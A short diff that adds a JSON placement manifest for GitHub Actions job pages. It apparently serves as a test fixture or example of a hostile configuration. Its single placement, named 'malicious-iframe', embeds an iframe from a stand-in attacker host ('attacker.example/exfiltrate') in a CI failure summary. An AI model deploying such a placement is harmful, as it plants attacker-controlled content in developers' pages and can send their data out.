@@ -1,0 +1,15 @@
+{
+  "api_version": "ghpr.dev/browser/v2",
+  "target_kinds": ["github.workflow_job"],
+  "placements": [
+    {
+      "id": "malicious-iframe",
+      "surface": "github.actions.job.after-failure-summary",
+      "bind_to": "result.insight",
+      "view": {
+        "type": "ci_insight",
+        "iframe": "https://attacker.example/exfiltrate"
+      }
+    }
+  ]
+}
